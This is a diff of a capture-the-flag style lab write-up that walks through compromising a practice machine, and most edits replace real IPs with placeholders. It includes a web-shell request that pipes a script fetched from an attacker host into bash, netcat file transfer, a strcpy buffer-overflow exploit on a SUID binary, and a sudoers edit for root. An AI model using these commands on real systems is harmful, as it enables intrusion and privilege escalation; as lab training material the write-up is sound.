@@ -52,7 +52,7 @@ We can now authenticate in the /phpmyadmin service, gaining access to the DB. As
 
 ![](./img/09-RCE.png)
 
-```https://10.0.2.5/forum/templates_c/rce.php?cmd=curl 10.0.2.15:9090/shell.sh | bash```
+```https://<TargetIP>/forum/templates_c/rce.php?cmd=curl <AttackerIP>:<HttpPort>/shell.sh | bash```
 
 
 *POST EXPLOITATION*
@@ -66,7 +66,9 @@ After some basic local enumeration, we can get the following information:
 Reading the file reveals the system credentials for lmezard, although ssh connection is restricted for this user.
 
 ```cat /home/LOOKATME/password```
+
 ```ssh lmezard@<IP>```
+
 ```su lmezard```
 
 ![](./img/10-lmezard.png)
@@ -76,7 +78,9 @@ Reading the file reveals the system credentials for lmezard, although ssh connec
 In lmezard's home directory, we can find a compressed file called "fun" and a README. We download and decompress the file for further analysis.
 
 ```nc -nlv <port> > fun``` in attacker
+
 ```nc <IP> <port> < fun``` in target system
+
 ```tar -xvf ./fun```
 
 The README suggests that solving the challenge will allow us access to the user laurie via SSH.
@@ -84,7 +88,9 @@ The README suggests that solving the challenge will allow us access to the user 
 Analyzing fun, we get pieces of information to reconstruct the password. 
 
 ```cat ft_fun/* | grep printf | grep -v haha```
+
 ```cat ft_fun/* | grep getme -A 3 | grep -v haha```
+
 ```cat ft_fun/* | grep return | grep -v haha```
 
 We deduce that the password lenght is 12, ending with "wnage" and that we need to hash the resulting string before attempting to log in, using SHA256. The characters left to order are "Iepthar".
@@ -137,6 +143,7 @@ We have to "digest" the password to use it. We therefore apply md5 (message dige
 The directory /home/zaz contains an interesting file, a SUID binary that belongs to root.
 
 ```./exploit_me Hello``` (command output)
+
 ```strings ./exploit_me```
 
 The program prints the argument received. Exploring the readable content of the file reveals the use of the insecure function strcpy. Assuming a buffer being used, we can try to perform a buffer overflow in order to gain root access by executing a shellcode.
@@ -151,7 +158,9 @@ The file decompilation supports our idea. The program uses a buffer of 140 bytes
 We coded a python script to generate the final payload.
 
 ```./exploit_me $(python payload.py)```
+
 ```echo 'zaz ALL=NOPASSWD: ALL' >> /etc/sudoers && sudo su```
+
 ```id```
 
 ![](./img/11-root.png)
